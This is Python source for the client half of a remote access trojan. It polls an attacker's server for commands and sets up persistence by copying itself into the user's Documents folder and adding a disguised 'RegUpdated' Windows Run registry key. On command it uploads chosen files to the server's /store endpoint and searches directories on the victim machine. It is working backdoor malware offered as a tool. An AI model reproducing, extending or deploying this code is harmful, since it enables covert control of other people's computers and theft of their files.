""" This script is for handling commands on the client side"""
import subprocess
import os, time, shutil
import socket, requests
import random, tempfile
import pyCon.config as config
import pyCon.printer as p
import winreg as wreg

from PIL import ImageGrab
from bs4 import BeautifulSoup

class PyConClient:

    def __init__(self,):
        self.persistence = False
        self.HOST = config.SERVER_ADDRESS
        self.userprofile = None
        self.connect()

    def post(self,post_data, url=None):
        url = self.HOST if not url else url
        if type(post_data) is dict and post_data['file']:
            res = requests.post(url, files=post_data)
        else:
            res = requests.post(self.HOST, data=post_data)
        return res

    def cmd(self,command):
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            proc.stderr.close()
            proc.stdin.close()
            return proc.stdout.read()
        except Exception as ex:
            requests.post(self.HOST,f'[-] Exception executing command "{command}"')
            return False

    def persist(self):
        if self.persistence is True:
            self.post('Persistence Has Been Achieved')
            return True
        try:
            path = os.getcwd().strip('\n')
            _ , self.userprofile = self.cmd("set USERPROFILE").decode().split("=")
            destination = self.userprofile + f'\\Documents\\client.exe'
            if not os.path.exists(destination):
                shutil.copyfile(path + 'client.exe', destination)
                key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                   wreg.KEY_ALL_ACCESS)
                wreg.SetValueEx(key,'RegUpdated',0,wreg.REG_SZ,destination)
                wreg.CloseKey(key)
                self.post(f'[+] Persistence is confirmed')
                self.persistence = True
                return True
        except Exception as ex:
            requests.post(self.HOST,f'[!] Error with persistence: {ex}')
            self.persistence = False
            pass

    def connect(self):
        # Begin Forever Loop
        self.persist()
        while True:

            command = requests.get(self.HOST).text.lower()

            # Terminate the connection
            if 'kill' in command:
                self.post("Connection Has Been Terminated")
                return 1

            # Grab and Send files: <grab><*><C:\Users\example.txt>
            elif 'grab*' in command:
                try:
                    grab, path = command.split('*')
                    if os.path.exists(path):
                        field_storage = {}
                        with open(path,'rb') as f:
                            content=  f.read()
                            content_length = len(content)
                            self.post(f'File located: {content_length / 1000}kbs')
                            files = {'file': content}
                            f.close()
                        self.post(files, self.HOST + '/store')
                    else:
                        self.post(f'[x] File Not Found {path}')
                except Exception as ex:
                    self.post(f'[!] Exception GrabFile:{str(ex)}')
                    pass

            # Search For FileExt example: "search" "<search_path>" * "<file_ext>"
            elif 'search' in command:
                command = command[7:]
                path, ext = command.split("*")
                lst = f'{p.blue}[i] Search Results for {command}:{p.green}'
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        lst += f'\n>> {os.path.join(dirpath, file)}'
                self.post(lst)

            # Add Persistence
            elif command == 'persist':
                self.persistence =self.persist()

if __name__ == '__main__':
    p.ok("Client has started")
    client = PyConClient()
    while True:
        try:
            if client.connect() == 1:
                break
        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(sleep_for)
            pass




